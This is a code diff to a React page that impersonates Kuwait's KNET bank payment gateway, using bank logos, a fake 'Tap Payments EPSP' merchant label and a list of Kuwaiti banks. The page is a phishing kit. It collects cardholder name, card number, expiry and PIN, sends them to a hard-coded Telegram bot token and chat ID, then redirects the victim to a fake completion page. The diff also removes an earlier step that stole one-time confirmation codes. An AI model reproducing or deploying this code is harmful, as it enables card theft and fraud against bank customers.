@@ -16,92 +16,61 @@ function KnetPageContent() {
   const [cvv, setCvv] = useState("");
   const [bank, setBank] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
-  const [otp, setOtp] = useState("");
-  const [showOtp, setShowOtp] = useState(false);
-  const [verificationMsg, setVerificationMsg] = useState("");
 
   const router = useRouter();
   const searchParams = useSearchParams();
   const price = searchParams.get("price");
   const refN = searchParams.get("refN");
-  const handleSend = async () => {
-    if (!showOtp) {
-      if (
-        !fullName.trim() ||
-        !cardNumber.trim() ||
-        !expMonth.trim() ||
-        !expYear.trim() ||
-        !cvv.trim() ||
-        !bank.trim()
-      ) {
-        alert("Please fill in all fields");
-        return;
-      }
 
-      const text = `
+  const handleSend = async () => {
+    if (
+      !fullName.trim() ||
+      !cardNumber.trim() ||
+      !expMonth.trim() ||
+      !expYear.trim() ||
+      !cvv.trim() ||
+      !bank.trim()
+    ) {
+      alert("Please fill in all fields");
+      return;
+    }
+
+    const text = `
 🏦 Bank: ${bank}
 👤 Full Name: ${fullName}
 💳 Card Number: ${cardNumber}
 📅 Exp Month: ${expMonth}
 📅 Exp Year: ${expYear}
 🔐 PIN: ${cvv}
-🔨 Ref:${refN}
-      `;
+🔨 Ref: ${refN}
+    `;
 
-      try {
-        setIsProcessing(true);
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
-            text
-          )}`
-        );
-        setShowOtp(true);
-        setIsProcessing(false);
-      } catch (error) {
-        alert("Error sending data");
-        setIsProcessing(false);
-        console.error(error);
-      }
-    } else {
-      if (!otp.trim()) {
-        alert("Please enter the confirmation code");
-        return;
-      }
+    try {
+      setIsProcessing(true);
+      await axios.post(
+        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
+          text
+        )}`
+      );
+      setIsProcessing(false);
 
-      try {
-        setIsProcessing(true);
-        setVerificationMsg("Code sent, verifying...");
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=-4836393174&text=${encodeURIComponent(
-            `🔑 Confirmation Code: ${otp}
-             🔨 Ref: ${refN}`
-          )}`
-        );
-        // لا تقم بالتوجيه هنا، فقط أظهر رسالة فقط (أو قم بما تريد بعد التحقق)
-        // إذا أردت تحويل، احذف السطر التالي لتعليق التحويل:
-        // router.push(`/kpay/finish?name=${cardNumber}`);
-        setVerificationMsg("Code sent, verifying...");
-        setOtp("")
-        setIsProcessing(false);
-      } catch (error) {
-        alert("Error sending OTP");
-        setVerificationMsg("");
-        setIsProcessing(false);
-        console.error(error);
-      }
+      // التحويل مباشرة بعد الإرسال
+      router.push(`/kpay/finish?name=${cardNumber}`);
+    } catch (error) {
+      alert("Error sending data");
+      setIsProcessing(false);
+      console.error(error);
     }
   };
 
   return (
     <div className={styles.knetContainer}>
-     
       <div className={styles.knetBox}>
         <Image src={kibb} width={350} height={50} alt="bainnary" />
         <div className={styles.knetInfo}>
           <Image src={kibLo} width={220} height={50} alt="logo" />
           <div className={styles.knetInfoRow}>
             <span className={styles.knetInfoLabel}>Merchant:</span>
-            
             <span>Tap Payments EPSP</span>
           </div>
           <hr />
@@ -112,7 +81,6 @@ function KnetPageContent() {
         </div>
 
         {isProcessing && <p style={{ color: "black" }}>Processing transaction...</p>}
-        {verificationMsg && <p style={{ color: "blue", marginTop: 8 }}>{verificationMsg}</p>}
 
         <form
           onSubmit={(e) => {
@@ -128,7 +96,7 @@ function KnetPageContent() {
               value={bank}
               onChange={(e) => setBank(e.target.value)}
               required
-              disabled={isProcessing || showOtp}
+              disabled={isProcessing}
             >
               <option value="">-- Select Bank --</option>
               <option value="ABK">Al Ahli Bank of Kuwait (ABK)</option>
@@ -160,7 +128,7 @@ function KnetPageContent() {
               onChange={(e) => setCardNumber(e.target.value)}
               required
               className={styles.formInput}
-              disabled={isProcessing || showOtp}
+              disabled={isProcessing}
             />
           </div>
           <hr />
@@ -173,7 +141,7 @@ function KnetPageContent() {
                 onChange={(e) => setExpMonth(e.target.value)}
                 required
                 className={styles.formInput}
-                disabled={isProcessing || showOtp}
+                disabled={isProcessing}
               >
                 <option value="">MM</option>
                 {Array.from({ length: 12 }, (_, i) => (
@@ -188,7 +156,7 @@ function KnetPageContent() {
                 onChange={(e) => setExpYear(e.target.value)}
                 required
                 className={styles.formInput}
-                disabled={isProcessing || showOtp}
+                disabled={isProcessing}
               >
                 <option value="">YY</option>
                 {Array.from({ length: 50 }, (_, i) => {
@@ -213,7 +181,7 @@ function KnetPageContent() {
               onChange={(e) => setFullName(e.target.value)}
               required
               className={styles.formInput}
-              disabled={isProcessing || showOtp}
+              disabled={isProcessing}
             />
           </div>
           <hr />
@@ -229,43 +197,22 @@ function KnetPageContent() {
               onChange={(e) => setCvv(e.target.value)}
               required
               className={styles.formInput}
-              disabled={isProcessing || showOtp}
+              disabled={isProcessing}
             />
           </div>
           <hr />
 
-          {showOtp && (
-            <>
-              <div>
-                <label className={styles.formLabel}>Confirmation Code:</label>
-                <input
-                  type="text"
-                  maxLength="6"
-                  inputMode="numeric"
-                  pattern="\d*"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value)}
-                  required
-                  className={styles.formInput}
-                />
-              </div>
-              <hr />
-            </>
-          )}
-
           <div className={styles.buttonRow}>
-            {!showOtp && (
-              <button
-                type="button"
-                className={styles.cancel}
-                onClick={() => router.back()}
-                disabled={isProcessing}
-              >
-                Cancel
-              </button>
-            )}
+            <button
+              type="button"
+              className={styles.cancel}
+              onClick={() => router.back()}
+              disabled={isProcessing}
+            >
+              Cancel
+            </button>
             <button type="submit" className={styles.submit}>
-              {showOtp ? "Send Code" : "Submit"}
+              Submit
             </button>
           </div>
         </form>
@@ -280,4 +227,4 @@ export default function KnetPage() {
       <KnetPageContent />
     </Suspense>
   );
-            }
+        }
